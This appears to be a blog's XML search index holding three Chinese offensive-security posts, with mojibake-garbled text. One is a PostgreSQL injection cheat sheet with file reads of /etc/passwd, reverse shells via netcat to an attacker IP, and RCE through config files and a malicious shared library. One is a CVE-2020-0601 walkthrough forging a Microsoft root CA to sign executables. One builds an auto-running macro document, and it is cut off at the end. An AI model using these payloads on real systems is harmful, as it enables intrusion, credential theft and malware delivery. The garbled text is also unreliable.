<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title><![CDATA[PostgreSQL Injection]]></title>
    <url>%2Farchives%2FPostgreSQL-Injection.html</url>
    <content type="text"><![CDATA[0x00 Sqli1ã€æ³¨é‡Š12--/**/ 2ã€æŸ¥è¯¢ç‰ˆæœ¬1SELECT version() 3ã€æŸ¥è¯¢ç”¨æˆ·12345SELECT user;SELECT current_user;SELECT session_user;SELECT usename FROM pg_user;SELECT getpgusername(); 4ã€åˆ—ç”¨æˆ·1SELECT usename FROM pg_user 5ã€åˆ—ä¸¾ç”¨æˆ·hash1SELECT usename, passwd FROM pg_shadow 6ã€åˆ—å‡ºæ•°æ®åº“ç®¡ç†å‘˜å¸æˆ·1SELECT usename FROM pg_user WHERE usesuper IS TRUE 7ã€åˆ—ä¸¾æƒé™1SELECT usename, usecreatedb, usesuper, usecatupd FROM pg_user 8ã€åˆ—ä¸¾å½“å‰dbåç§°1SELECT current_database() 9ã€åˆ—ä¸¾db1SELECT datname FROM pg_database 10ã€åˆ—ä¸¾è¡¨å1SELECT table_name FROM information_schema.tables 11ã€åˆ—ä¸¾åˆ—å1SELECT column_name FROM information_schema.columns WHERE table_name='data_table' 12ã€æŠ¥é”™æ³¨å…¥123456789,cAsT(chr(126)||vErSiOn()||chr(126)+aS+nUmeRiC),cAsT(chr(126)||(sEleCt+table_name+fRoM+information_schema.tables+lImIt+1+offset+data_offset)||chr(126)+as+nUmeRiC)--,cAsT(chr(126)||(sEleCt+column_name+fRoM+information_schema.columns+wHerE+table_name='data_table'+lImIt+1+offset+data_offset)||chr(126)+as+nUmeRiC)--,cAsT(chr(126)||(sEleCt+data_column+fRoM+data_table+lImIt+1+offset+data_offset)||chr(126)+as+nUmeRiC)' and 1=cast((SELECT concat('DATABASE: ',current_database())) as int) and '1'='1' and 1=cast((SELECT table_name FROM information_schema.tables LIMIT 1 OFFSET data_offset) as int) and '1'='1' and 1=cast((SELECT column_name FROM information_schema.columns WHERE table_name='data_table' LIMIT 1 OFFSET data_offset) as int) and '1'='1' and 1=cast((SELECT data_column FROM data_table LIMIT 1 OFFSET data_offset) as int) and '1'='1 13ã€xml helper1select query_to_xml('select * from pg_user',true,true,''); -- å¯è¿”å›æ‰€æœ‰ç»“æœï¼Œå¯åœ¨æŠ¥é”™æ³¨å…¥ä¸­ä½¿ç”¨ï¼Œå¦å¤–queryè¯­å¥æ˜¯ä¸ªstringå°±è¡Œï¼Œå¯è¿›è¡Œæ‹¼æ¥ç­‰æ–¹å¼è¿›è¡Œwafç»•è¿‡ 12select database_to_xml(true,true,''); -- dump the current database to XMLselect database_to_xmlschema(true,true,''); -- dump the current db to an XML schema 14ã€ç›²æ³¨12' and substr(version(),1,10) = 'PostgreSQL' and '1 -&gt; OK' and substr(version(),1,10) = 'PostgreXXX' and '1 -&gt; KO 15ã€å»¶æ—¶æ³¨å…¥12AND [RANDNUM]=(SELECT [RANDNUM] FROM PG_SLEEP([SLEEPTIME]))AND [RANDNUM]=(SELECT COUNT(*) FROM GENERATE_SERIES(1,[SLEEPTIME]000000)) 16ã€å †å æŸ¥è¯¢ä½¿ç”¨;è¿›è¡Œè¯­å¥åˆ†å‰²1http://host/vuln.php?id=injection';create table NotSoSecure (data varchar(200));-- 17ã€æŸ¥è¯¢æœºå™¨ip12select inet_server_addr();select inet_client_addr(); å¯¹äºDBæœåŠ¡å™¨çš„ipï¼Œé™¤äº†ä¸Šé¢çš„æŸ¥è¯¢ï¼Œè¿˜å¯ä»¥é€šè¿‡è¯»å–/proc/net/fib_trie æ¥è·å–ã€‚ 0x01 æ–‡ä»¶è¯»å–12select pg_ls_dir('./');select pg_read_file('PG_VERSION', 0, 200); è€ç‰ˆæœ¬çš„postgreä¸æ”¯æŒç»å¯¹è·¯å¾„ã€‚æ–°ç‰ˆæœ¬æ”¯æŒdefault_role_read_server_filesç»„çš„ç”¨æˆ·æˆ–è€…è¶…çº§ç”¨æˆ·ä½¿ç”¨ç»å¯¹è·¯å¾„è¿›è¡Œæ–‡ä»¶è¯»å–ã€‚ åˆ©ç”¨copyè¿›è¡Œæ–‡ä»¶è¯»å–ï¼š1234CREATE TABLE temp(t TEXT);COPY temp FROM '/etc/passwd';SELECT query_to_xml('SELECT * FROM temp',true,true,'');DROP TABLE IF EXISTS temp; åˆ©ç”¨ large object è¿›è¡Œæ–‡ä»¶è¯»å–123SELECT lo_import('/etc/passwd'); -- will create a large object from the file and return the OIDSELECT lo_get(16420); -- use the OID returned from the aboveSELECT * from pg_largeobject; -- or just get all the large objects and their data è·å–OIDæ–¹å¼123SELECT loid from pg_largeobject ORDER BY loid desc limit 1 OFFSET 0select CAST((select loid||$$|$$ FROM pg_largeobject ORDER BY loid desc limit 1 OFFSET 0) as int) --æŠ¥é”™æ³¨å…¥ä½¿ç”¨select CAST((select oid||$$|$$ FROM pg_largeobject_metadata ORDER BY oid desc limit 1 OFFSET 0) as int) --æŠ¥é”™æ³¨å…¥ä½¿ç”¨ åˆ é™¤OID1SELECT lo_unlink(OID) ; 0x02 æ–‡ä»¶å†™å…¥1234CREATE TABLE pentestlab (t TEXT);INSERT INTO pentestlab(t) VALUES('nc -lvvp 2346 -e /bin/bash');SELECT * FROM pentestlab;COPY pentestlab(t) TO '/tmp/pentestlab'; 1234SELECT lo_from_bytea(43210, 'your file data goes in here'); -- create a large object with OID 43210 and some dataSELECT lo_from_bytea(43210, decode('encode base64 string', 'base64')); é€šè¿‡base64æ•°æ®å†™æ–‡ä»¶SELECT lo_put(43210, 20, 'some other data'); -- append data to a large object at offset 20SELECT lo_export(43210, '/tmp/testexport'); -- export data to /tmp/testexport OIDå¯ä»¥è‡ªå·±éšä¾¿æŒ‡å®šä¸€ä¸ªï¼Œlo_put ä¸ºè¿½åŠ æ–‡ä»¶ã€‚ 0x03 å‘½ä»¤æ‰§è¡Œ1ã€ CVE-2019â€“9193å¯ä»¥ç›´è¿dbæˆ–è€…æ‰§è¡Œå¤šè¯­å¥çš„æ—¶å€™ã€‚æ‹¿å›æ˜¾ï¼š12345DROP TABLE IF EXISTS cmd_exec; -- [Optional] Drop the table you want to use if it already existsCREATE TABLE cmd_exec(cmd_output text); -- Create the table you want to hold the command outputCOPY cmd_exec FROM PROGRAM 'id'; -- Run the system command via the COPY FROM PROGRAM functionSELECT * FROM cmd_exec; -- [Optional] View the resultsDROP TABLE IF EXISTS cmd_exec; -- [Optional] Remove the table åªæ‰§è¡Œ1COPY (select 1) TO PROGRAM 'id'; 2ã€Using libc.so.612CREATE OR REPLACE FUNCTION system(cstring) RETURNS int AS '/lib/x86_64-linux-gnu/libc.so.6', 'system' LANGUAGE 'c' STRICT;SELECT system('cat /etc/passwd | nc &lt;attacker IP&gt; &lt;attacker port&gt;'); 3ã€åˆ©ç”¨udfsqlmap udféœ€è¦å¯¹åº”postgreç‰ˆæœ¬ã€‚ 12CREATE OR REPLACE FUNCTION sys_eval(text) RETURNS text AS '/xxx/cmd.so', 'sys_eval' LANGUAGE C RETURNS NULL ON NULL INPUT IMMUTABLE;SELECT sys_eval("id"); 4ã€Using Config fileå¤šè¯­å¥ä¸èƒ½ä½¿ç”¨çš„æƒ…å†µä¸‹ï¼Œå¯åˆ©ç”¨é…ç½®æ–‡ä»¶è¿›è¡Œå‘½ä»¤æ‰§è¡Œã€‚aã€ PG version &gt; 10å‚è€ƒpostgres-sqliï¼Œå¯åˆ©ç”¨ ssl_passphrase_commandè¿›è¡ŒRCEã€‚åˆ©ç”¨æ¡ä»¶ä¸ºï¼Œéœ€è¦ä¿®æ”¹é…ç½®æ–‡ä»¶å¼€å¯SSL1ssl on å¦å¤–ï¼Œéœ€è¦ç§é’¥é…ç½®ä¸€ä¸ªå¯†ç ï¼Œç»™ç§é’¥åŠ å¯†ç å¯ä»¥åˆ©ç”¨openssl:1openssl rsa -aes256 -in private.key -out private_passphrase.key åˆ©ç”¨é…ç½®ä¸ºï¼š12345ssl = onssl_cert_file = '/etc/ssl/certs/ssl-cert-snakeoil.pem' ssl_key_file = '/var/lib/postgresql/11/main/PG_VERSION'ssl_passphrase_command_supports_reload = onssl_passphrase_command = 'bash -c "test -p /dev/shm/pipe || mkfifo /dev/shm/pipe; nc 192.168.122.1 8000 &lt; /dev/shm/pipe | /bin/bash &gt; /dev/shm/pipe &amp; echo passphrase; exit 0"' å…¶ä¸­ssl_cert_fileä¸ºè¯ä¹¦æ–‡ä»¶ï¼Œå¦‚æœæ²¡æœ‰ï¼Œå¯è‡ªå·±ä¸Šä¼ åˆ°/tmpè·¯å¾„è¿›è¡Œå¼•ç”¨ï¼Œssl_key_fileä¸ºå¸¦å¯†ç çš„ç§é’¥æ–‡ä»¶ï¼Œç”±äºæ­¤æ–‡ä»¶éœ€è¦æƒé™ä¸º0600,æ‰€ä»¥å¯å¯¹PGçš„PG_VERSIONè¿›è¡Œè¦†ç›–ï¼ŒPG_VERSIONè·¯å¾„ä¸é…ç½®æ–‡ä»¶è·¯å¾„ç›¸åŒã€‚ssl_passphrase_commandå¯ä¿®æ”¹ä¸ºè¦æ‰§è¡Œçš„å‘½ä»¤ï¼Œå…¶ä¸­echo passphrase çš„ passphraseä¸ºç§é’¥è®¾ç½®çš„å¯†ç ã€‚ å…·ä½“æ“ä½œä¸ºï¼Œè·å–pgé…ç½®è·¯å¾„:1select setting from pg_settings where name='config_file' å¦‚æœé…ç½®æ–‡ä»¶è·¯å¾„ä¸ºetc/postgresql/11/main/postgresql.conf&#39;, åˆ™è¦è¦†ç›–çš„PG_VERSIONè·¯å¾„ä¸º/var/lib/postgresql/11/main/PG_VERSION é€šè¿‡æ–‡ä»¶è¯»å–çš„æ–¹å¼è¯»å–é…ç½®æ–‡ä»¶æŸ¥çœ‹æ˜¯å¦é…ç½®äº†SSLï¼Œå¦‚æœå·²é…ç½®äº†è¯ä¹¦åŠkeyï¼Œéœ€è¦è¯»å–å…¶keyæ–‡ä»¶ï¼Œå¹¶å¯¹å…¶keyæ–‡ä»¶è®¾ç½®å¯†ç ï¼Œå¦‚æœæœªé…ç½®ï¼Œå¯è‡ªå·±æœ¬åœ°ç”Ÿæˆå¹¶é€šè¿‡æ–‡ä»¶å†™å…¥çš„æ–¹å¼è¿›è¡Œå†™å…¥ã€‚æ³¨æ„ï¼šä¸€å®šè¦æŠŠåŸé…ç½®æ–‡ä»¶è¿›è¡Œå¤‡ä»½!!! æ–¹ä¾¿æ”»å‡»å®Œæˆä¹‹åè¿›è¡Œæ¢å¤!!!1234567891011ç®€è¦è¿‡ç¨‹ï¼š1ã€è¯»å–é…ç½®æ–‡ä»¶;2ã€å¦‚æœªé…ç½®è¯ä¹¦æ–‡ä»¶ï¼Œåˆ™æœ¬åœ°ç”Ÿæˆä¸€ä¸ªè¯ä¹¦æ–‡ä»¶;3ã€ç»™å¯¹åº”è¯ä¹¦çš„ç§˜é’¥æ–‡ä»¶æ·»åŠ å¯†ç ;4ã€ä¿®æ”¹é…ç½®æ–‡ä»¶ï¼Œæ·»åŠ ä¸Šé¢çš„SSLåˆ©ç”¨é…ç½®;5ã€å°†ä¿®æ”¹å¥½çš„è¯ä¹¦ã€ç§˜é’¥æ–‡ä»¶å†™å…¥æœåŠ¡å™¨;6ã€å°†ä¿®æ”¹çš„é…ç½®æ–‡ä»¶è¿›è¡Œé…ç½®æ–‡ä»¶æ›¿æ¢ï¼›7ã€è§¦å‘æ”»å‡»; è§¦å‘æ”»å‡»æ–¹å¼ä¸ºï¼š SELECT pg_reload_conf()8ã€æ¢å¤é…ç½®æ–‡ä»¶ã€‚ bã€All versionä½ç‰ˆæœ¬çš„PGæ²¡æœ‰ssl_passphrase_command,æŸ¥çœ‹æ–‡æ¡£å‘ç°å¯ä»¥ä½¿ç”¨archive_command,ä½†æ˜¯è¦æ±‚æ•°æ®åº“æœåŠ¡é‡å¯ï¼ï¼åˆ©ç”¨æ–¹å¼ä¸ºæ·»åŠ ä»¥ä¸‹é…ç½®ï¼š123archive_mode = on archive_command = "touch /tmp/xxxx"archive_timeout = â€‹ â€‹10 å…¶ä¸­archive_timeoutè¡¨ç¤ºæ¯åç§’æ‰§è¡Œä¸€æ¬¡ï¼Œarchive_command ä¸ºè¦æ‰§è¡Œçš„å‘½ä»¤ã€‚ä¿®æ”¹é…ç½®æ–‡ä»¶ä»¥åï¼Œåœ¨PGæœåŠ¡é‡å¯åï¼Œä¼šæ‰§è¡Œarchive_commandé…ç½®çš„å‘½ä»¤ã€‚ å¦å¤–ï¼Œåˆ©ç”¨å†™æ–‡ä»¶å¯ä»¥å†™authorized_keys, ä½†æ˜¯å¦‚æœæ²¡æœ‰.sshç›®å½•çš„æ—¶å€™ï¼Œå¯ä»¥åˆ©ç”¨é…ç½®æ–‡ä»¶è¿›è¡Œç›®å½•åˆ›å»º(è¿™é‡Œéœ€è¦PGå·²ç»å¼€æœºäº†LOGåŠŸèƒ½ï¼Œå¦åˆ™ä¾ç„¶éœ€è¦é‡å¯PGæœåŠ¡)ã€‚å…·ä½“æ“ä½œä¸ºï¼šä¿®æ”¹é…ç½®æ–‡ä»¶ï¼Œä¿®æ”¹log_directoryä¸º.sshç›®å½•ã€‚1234567log_destination = 'csvlog'log_directory = '/home/postgresql/.ssh/'log_filename = 'postgresql-%Y-%m-%d_%H%M%S.log'log_rotation_age = '1d'log_rotation_size = '512MB'log_timezone = 'Asia/Hong_Kong'logging_collector = 'on' æ›¿æ¢confæ–‡ä»¶å¹¶æ‰§è¡Œï¼š1SELECT pg_reload_conf() ä¹‹åå†å†™å…¥authorized_keyså³å¯ã€‚ cã€ All versionåˆ©ç”¨session_preload_librariesã€‚é¦–å…ˆéœ€è¦çŸ¥é“æœåŠ¡å™¨ç«¯PGçš„ç‰ˆæœ¬ï¼Œç„¶åæ ¹æ®å…¶ç‰ˆæœ¬æ¥ç¼–è¯‘åˆ©ç”¨åº“ã€‚åˆ©ç”¨ä»£ç ï¼šexp.c12345678910#include "postgres.h"#include "fmgr.h"#include &lt;stdlib.h&gt;#ifdef PG_MODULE_MAGICPG_MODULE_MAGIC;#endifvoid __attribute__((constructor)) pwn(void)&#123; system("touch /tmp/bbbbbbbb");&#125; å¯åœ¨å¯¹åº”ç³»ç»Ÿä¸Šä¸‹è½½å¯¹åº”ç‰ˆæœ¬çš„postgresql-server-dev-xï¼Œç„¶åä½¿ç”¨ä»¥ä¸‹å‘½ä»¤è¿›è¡Œç¼–è¯‘:1gcc exp.c -I `pg_config --includedir-server` -fPIC -shared -o exp.so ä¹‹åå°†exp.soä¸Šä¼ è‡³æ•°æ®åº“æœåŠ¡å™¨ã€‚ä¿®æ”¹é…ç½®æ–‡ä»¶æ·»åŠ ï¼š1session_preload_libraries='/tmp/exp.so' è¦†ç›–é…ç½®æ–‡ä»¶ï¼Œå¹¶è¿›è¡Œreloadã€‚1SELECT pg_reload_conf() å½“æœ‰æ–°è¿æ¥äº§ç”Ÿæ—¶ï¼Œä¼šè§¦å‘åŠ è½½.soè¾¾åˆ°RCEã€‚ å¿…é¡»ä¿è¯.soæ²¡é—®é¢˜ï¼ˆç‰ˆæœ¬å¯¹åº”ï¼‰ï¼Œå¦åˆ™ä¼šå¯¼è‡´dbæŒ‚æ‰ã€‚ 0x04 Bypassä½¿ç”¨CHR1SELECT CHR(65)||CHR(66)||CHR(67); ä½¿ç”¨ç¾å…ƒç¬¦å·12SELECT $$This is a string$$SELECT $TAG$This is another string$TAG$ ç¾å…ƒç¬¦å¯æ›¿æ¢å¼•å·ã€‚ 0x05 References PostgreSQL Injection.md postgres-sqli PostgreSQLçš„é‚£ç‚¹äº‹å„¿.html]]></content>
      <categories>
        <category>å¥‡æŠ€æ·«å·§</category>
      </categories>
      <tags>
        <tag>Sqli</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[CVE-2020-0601]]></title>
    <url>%2Farchives%2Fcve_2020_0601.html</url>
    <content type="text"><![CDATA[0x00 CVE-2020-0601 æ¼æ´åŸç†å¼•ç”¨æˆ‘å¸å¤§ä½¬æ€»ç»“:1.åŸºç¡€çŸ¥è¯†ï¼šECCç§é’¥+æ¤­åœ†æ›²çº¿=ECCå…¬é’¥ 2.æ¼æ´ï¼šå¾®è½¯çš„ç§é’¥+å¾®è½¯é€‰çš„æ¤­åœ†æ›²çº¿=å¾®è½¯æ ¹è¯ä¹¦é‡Œé¢çš„å…¬é’¥é»‘å®¢çš„ç§é’¥+é»‘å®¢é€‰çš„æ¤­åœ†æ›²çº¿=å¾®è½¯æ ¹è¯ä¹¦é‡Œé¢çš„å…¬é’¥ä¸åŒçš„æ¤­åœ†æ›²çº¿å’Œä¸åŒçš„ç§é’¥ï¼Œèƒ½äº§ç”Ÿå€¼ä¸€æ¨¡ä¸€æ ·çš„å…¬é’¥ã€‚win10å¼€å§‹é»˜è®¤æ·»åŠ äº†å¾®è½¯çš„ECCæ ¹è¯ä¹¦ï¼Œåœ¨åšè¯ä¹¦é“¾éªŒè¯æ—¶ï¼Œä¼šä¸€ç›´éªŒè¯åˆ°å¾®è½¯æ ¹è¯ä¹¦é‡Œé¢çš„å…¬é’¥çš„hashå€¼ï¼Œè¿™ä¸ªå€¼ç›´æ¥å†™åœ¨äº†crypt32.dllé‡Œé¢ï¼ŒéªŒè¯æ—¶æ²¡æœ‰å¯¹æ¯”æ˜¯ä¸æ˜¯åŒä¸€ä¸ªæ¤­åœ†æ›²çº¿ï¼Œåªå¯¹æ¯”äº†å…¬é’¥å€¼å°±ä¸‡äº‹å¤§å‰äº†ï¼Œå¯¼è‡´äº†é»‘å®¢æ‹¿è‡ªå·±çš„ç§é’¥éšä¾¿ç­¾ä¸ªåï¼Œéƒ½ä»¥ä¸ºæ˜¯å¾®è½¯è‡ªå·±ç­¾çš„ã€‚ 3.win7å—å½±å“å—ï¼Ÿwin7æ²¡æœ‰é»˜è®¤æ·»åŠ å¾®è½¯çš„ECCæ ¹è¯ä¹¦ï¼Œcrypt32.dllé‡Œé¢ä¹Ÿæ²¡è¿™ä¸ªhashå€¼ï¼Œæ²¡æ³•ç›´æ¥å¯¹æ¯”é€šè¿‡ã€‚ç»“è®ºï¼šWindows 7ä¸å—å½±å“ 4.XPã€2003å—å½±å“å—ï¼ŸECCæ˜¯ä¸ªä»€ä¹ˆé¬¼ï¼Ÿ 5.æˆ‘èƒ½è·‘å‡ºå¾®è½¯æ ¹è¯ä¹¦é‡Œé¢çš„ç§é’¥å—ï¼Ÿæ´—æ´—ç¡å§ã€‚ 0x01 CVE-2020-0601 æ¼æ´åˆ©ç”¨é¦–å…ˆæ¥çœ‹ä¸‹å¼€æºçš„å·¥å…·ï¼š https://github.com/kudelskisecurity/chainoffools è¿™ä¸ªå·¥å…·ä½¿ç”¨äº† USERTrust ECC Certification Authorityçš„è¯ä¹¦æ¥è¿›è¡ŒéªŒè¯ã€‚å‚ç…§è¿™æ¬¾å·¥å…·ç”Ÿæˆè¯ä¹¦ï¼Œå¹¶å¯¹exeè¿›è¡Œç­¾åï¼ŒæŸ¥çœ‹ç­¾åä¿¡æ¯å¦‚ä¸‹ï¼š ç”±äºä¸å­˜åœ¨æ ¹è¯ä¹¦ï¼Œæ‰€ä»¥ä¼šçœ‹åˆ°éªŒè¯å¹¶æ²¡æœ‰é€šè¿‡ï¼Œè®¿é—®ç½‘ç«™ï¼šhttps://usertrustecccertificationauthority-ev.comodoca.com/ä¼šåœ¨ç³»ç»Ÿå®‰è£…æ ¹è¯ä¹¦ï¼Œè¿™æ ·å°±ä¼šè®©ç­¾åæ­£å¸¸ã€‚ å¦‚æœè¦ä¸å®‰è£…åˆ«çš„è¯ä¹¦è®©ç­¾åæ­£å¸¸å°±éœ€è¦å¯»æ‰¾ç³»ç»Ÿé»˜è®¤ä¿¡ä»»çš„ECCç­¾åçš„æ ¹è¯ä¹¦ã€‚ 0x02 é»˜è®¤ECCç­¾åæ ¹è¯ä¹¦æµ‹è¯•é¦–å…ˆï¼Œæˆ‘ä»¬æ¥æŸ¥çœ‹ä¸€ä¸‹é»˜è®¤æœ‰å“ªäº›æ ¹è¯ä¹¦ï¼š1dir cert:\localmachine\root | Where-Object &#123; $_.FriendlyName -like "*ECC*" &#125; å¯ä»¥çœ‹åˆ°è¿™é‡Œé¢æœ‰3ä¸ªç³»ç»Ÿé»˜è®¤çš„ECCç­¾åçš„æ ¹è¯ä¹¦ã€‚æˆ‘ä»¬éšæ„å¯¼å‡ºå…¶ä¸­ä¸€ä¸ªæ ¹è¯ä¹¦ï¼šcmdè¾“å…¥certmgr.mscæ‰“å¼€è¯ä¹¦ç®¡ç†ï¼Œæ‰¾åˆ°ECCç­¾åæ ¹è¯ä¹¦è¿›è¡Œå¯¼å‡ºï¼š å¯¼å‡ºç›´æ¥é€‰æ‹©Base64ç¼–ç é‚£ä¸ªå°±è¡Œã€‚ ä½¿ç”¨opensslæŸ¥çœ‹è¯ä¹¦ä¿¡æ¯ï¼š1openssl x509 -in ca.cer -text -noout æŸ¥çœ‹gen-key.py åŠREADMEï¼Œè¿™é‡Œæˆ‘ä»¬éœ€è¦æå–è¯ä¹¦çš„å…¬é’¥ Public Key å’Œåºåˆ—å·Serial Number ä»¥åŠSubjectã€‚ ä¸ºäº†æ–¹ä¾¿æå–ï¼Œå¯ä»¥ä½¿ç”¨powershellï¼Œè¿™æ ·å°±æŠŠæ‰€éœ€è¦çš„å†…å®¹æå–å‡ºæ¥äº†1dir cert:\localmachine\root | Where-Object &#123; $_.FriendlyName -like "*ECC*" &#125; | %&#123;[bitconverter]::tostring($_.publickey.encodedkeyvalue.rawdata).replace('-','');$_.SerialNumber;$_.subject;"="*200&#125; æˆ‘ä»¬éšæ„é€‰æ‹©ä¸€ä¸ªï¼Œæ¯”å¦‚ï¼š104C711162A761D568EBEB96265D4C3CEB4F0C330EC8F6DD76E39BCC849ABABB8E34378D581065DEFC77D9FCED6B39075DE0CB090DE23BAC8D13E67E019A91B86311E5F342DEE17FD15FB7E278A32A1EAC98FC97E18CB2F3B2C487A7DA6F40107AC 14982666DC7CCD8F4053677BB999EC85 CN=Microsoft ECC Product Root Certificate Authority 2018, O=Microsoft Corporation, L=Redmond, S=Washington, C=US å‚ç…§POCé‡Œé¢çš„READMEæ¥è¿›è¡Œç”Ÿæˆï¼šç”Ÿæˆkeyæ¨¡ç‰ˆï¼š1openssl ecparam -name secp384r1 -genkey -noout -out p384-key.pem -param_enc explicit æ›¿æ¢gen-key.pyé‡Œé¢çš„å…¬é’¥å­—ç¬¦ä¸²ã€‚ç”Ÿæˆå¯¹åº”çš„ç§é’¥ï¼š1python gen-key.py ä½¿ç”¨è·å–çš„åºåˆ—å·å’Œsubjç”Ÿæˆå‡å†’çš„CA1openssl req -key p384-key-rogue.pem -new -out ca-rogue.pem -x509 -set_serial 0x14982666DC7CCD8F4053677BB999EC85 -subj "/C=US/ST=Washington/L=Redmond/O=Microsoft Cor poratio/CN=Microsoft ECC TS Root Certificate Authority 2018" æ¥ä¸‹æ¥ï¼Œå°±å¯ä»¥ç”Ÿæˆç§é’¥å’Œè¯ä¹¦ï¼Œåœ¨è¿™é‡Œéœ€è¦æ›¿æ¢ä¸€ä¸‹é¡¹ç›®é‡Œé¢çš„openssl.cnfä¸ºä»¥ä¸‹å†…å®¹ï¼š123456789101112131415161718192021222324252627282930313233[ req ]default_bits = 2048 # RSA key sizeencrypt_key = yes # Protect private keydefault_md = sha1 # MD to useutf8 = yes # Input is UTF-8string_mask = utf8only # Emit UTF-8 stringsprompt = yes # Prompt for DNdistinguished_name = codesign_dn # DN templatereq_extensions = codesign_reqext # Desired extensions[ codesign_dn ]countryName = "1. Country Name (2 letters) (eg, DK) "countryName_max = 2stateOrProvinceName = "2. State or Province Name (eg, Denmark) "localityName = "3. Locality Name (eg, Copenhagen) "organizationName = "4. Organization Name (eg, ollypwn) "organizationalUnitName = "5. Organizational Unit Name (eg, ollypwn) "commonName = "6. Common Name (eg, Olly Pwn)"commonName_max = 64[ codesign_reqext ]basicConstraints = CA:FALSEkeyUsage = critical,digitalSignatureextendedKeyUsage = critical,codeSigningsubjectKeyIdentifier = hash[ usr_cert ]basicConstraints = CA:FALSEkeyUsage = digitalSignatureextendedKeyUsage = codeSigning [ v3_req ]keyUsage = critical,digitalSignatureextendedKeyUsage = critical,codeSigning ç”Ÿæˆï¼š12345openssl ecparam -name prime256v1 -genkey -noout -out prime256v1-privkey.pemopenssl req -key prime256v1-privkey.pem -config openssl.cnf -new -out prime256v1.csr -subj "/C=US/ST=Washington/L=Redmond/O=Microsoft Cor poration/CN=Microsoft ECC TS Root Certificate Authority 2018"openssl x509 -req -in prime256v1.csr -CA ca-rogue.pem -CAkey p384-key-rogue.pem -CAcreateserial -out client-cert.pem -days 500 -extensions v3_req -extfile openssl.cnf å°†è¯ä¹¦è½¬æ¢ä¸ºpkcs12:1openssl pkcs12 -export -in client-cert.pem -inkey prime256v1-privkey.pem -certfile ca-rogue.pem -out cert.p12 ä½¿ç”¨osslsigncodeæˆ–è€…signtoolç­¾åï¼š 1osslsigncode sign -pkcs12 ./cert.p12 -t http://timestamp.verisign.com/scripts/timstamp.dll -in putty.exe -out putty_signed.exe å¦‚æœè½¬æ¢ä¸ºpkcs12æ—¶æ·»åŠ äº†å¯†ç ï¼Œç­¾åçš„æ—¶å€™éœ€è¦æŒ‡å®šï¼š1osslsigncode sign -pkcs12 ./cert.p12 -t http://timestamp.verisign.com/scripts/timstamp.dll -in putty.exe -out putty_signed.exe -pass 123123 å°†ç­¾åå¥½çš„EXEæ”¾åˆ°æœªæ‰“è¡¥ä¸çš„Win10 ä¸Šé¢æŸ¥çœ‹ç­¾åä¿¡æ¯ï¼š 0x03 å…³äºHTTPSåŠ«æŒHTTPSåŠ«æŒéœ€è¦ä¸­é—´äººï¼Œå¦å¤–éœ€è¦ç”Ÿæˆæ‰€éœ€è¦çš„è¯ä¹¦æ–‡ä»¶ï¼Œç”Ÿæˆæ–¹æ³•å¯å‚è€ƒé¡¹ç›®ï¼š https://github.com/ollypwn/cve-2020-0601 ç»“æœå¦‚ä¸‹å›¾ï¼š 0x04 æ€»ç»“å…³äºæ­¤æ¼æ´ï¼Œç­¾åçš„äºŒè¿›åˆ¶æ–‡ä»¶çš„å…æ€æ•ˆæœä¸€èˆ¬ï¼Œä½†æ˜¯ç»“åˆä¸­é—´äººé’“é±¼è¿˜æ˜¯å¾ˆæ£’çš„ã€‚å»ºè®®å°ä¼™ä¼´ä»¬å°½å¿«å‡çº§ç³»ç»Ÿã€‚]]></content>
      <categories>
        <category>å¥‡æŠ€æ·«å·§</category>
      </categories>
      <tags>
        <tag>phishing</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[ä¸ç‚¹æˆ‘å°±å¼¹å¼¹å¼¹]]></title>
    <url>%2Farchives%2Fpopups_advanced_maldoc.html</url>
    <content type="text"><![CDATA[0x00 officeå®çš„åˆ©ç”¨ä»walmartlabså­¦æ¥çš„ï¼Œè®©å®å¤šå¼¹å‡ æ¬¡ï¼Œæé«˜æˆåŠŸç‡ã€‚ åˆ›å»ºæ–¹å¼1:1ã€ åˆ›å»ºä¸€ä¸ªåŒ…å«å®çš„Excelï¼Œè®©è¿™ä¸ªExcelåœ¨å¼€å¯å®çš„çŠ¶æ€ä¸‹ï¼Œæ‰“å¼€å¯ä»¥æ‰§è¡Œï¼Œä¿å­˜ä¸ºï¼ˆxls æˆ–è€… xlsm ï¼‰æ¯”å¦‚æ·»åŠ ä»¥ä¸‹å®ï¼š1Private Sub Workbook_Open() Debugging End Sub Public Function Debugging() As Variant Dim Str As String Str = "calc.exe" Const HIDDEN_WINDOW = 0 strComputer = "." Set objWMIService = GetObject("winmgmts:\\" &amp; strComputer &amp; "\root\cimv2") Set objStartup = objWMIService.Get("Win32_ProcessStartup") Set objConfig = objStartup.SpawnInstance_ objConfig.ShowWindow = HIDDEN_WINDOW Set objProcess = GetObject("winmgmts:\\" &amp; strComputer &amp; "\root\cimv2:Win32_Process") objProcess.Create Str, Null, objConfig, intProcessID End Function 2ã€åˆ›å»ºä¸€ä¸ªwordæ–‡æ¡£ï¼Œå†æ’å…¥å¤„é€‰æ‹©æ’å…¥å¯¹è±¡,ç„¶åé€‰æ‹©æ’å…¥å¯¹è±¡-&gt;ç”±æ–‡ä»¶åˆ›å»º-&gt;é€‰æ‹©åˆšåˆšåˆ›å»ºå¥½çš„åŒ…å«å®ä»£ç çš„Excel (ä¸è¦ç‚¹é“¾æ¥åˆ°æ–‡ä»¶å’Œæ˜¾ç¤ºä¸ºå›¾æ ‡ï¼)ï¼Œæƒ³å¼¹å‡ æ¬¡ï¼Œå°±æ’å‡ æ¬¡ã€‚ğŸ¤”3ã€ä½¿ç”¨å¿«æ·é”®éšè—æ’å…¥çš„å¯¹è±¡ï¼Œå¿«æ·é”®ä¸ºâ€Ctrl+Shift+Hâ€4ã€å°†wordæ–‡æ¡£å¦å­˜ä¸ºRTFæ ¼å¼5ã€ç¼–è¾‘RTFæ–‡æ¡£ï¼Œä¿®æ”¹\objemb ä¸º\objupdate\objemb, ä¹‹åå°†rtfä¿®æ”¹ä¸ºdocã€‚ åˆ›å»ºæ–¹å¼2:1-3ã€åŒä¸Š4ã€å°†wordæ–‡æ¡£å¦å­˜ä¸º.docxæ ¼å¼ï¼Œå…³é—­å†é‡æ–°æ‰“å¼€docx5ã€å°†æ–°çš„docxæ ¼å¼æ–‡ä»¶å¦å­˜ä¸ºrtfæ ¼å¼ï¼Œä¹‹åä¿®æ”¹rtfä¸ºdocã€‚ åˆ›å»ºæ–¹å¼3:1ã€ä½¿ç”¨Excel 4.0 å®åˆ›å»ºåŒ…å«å®çš„Excelæ–‡ä»¶ã€‚2-5ã€åŒä¸Š æ•ˆæœ]]></content>
      <tags>
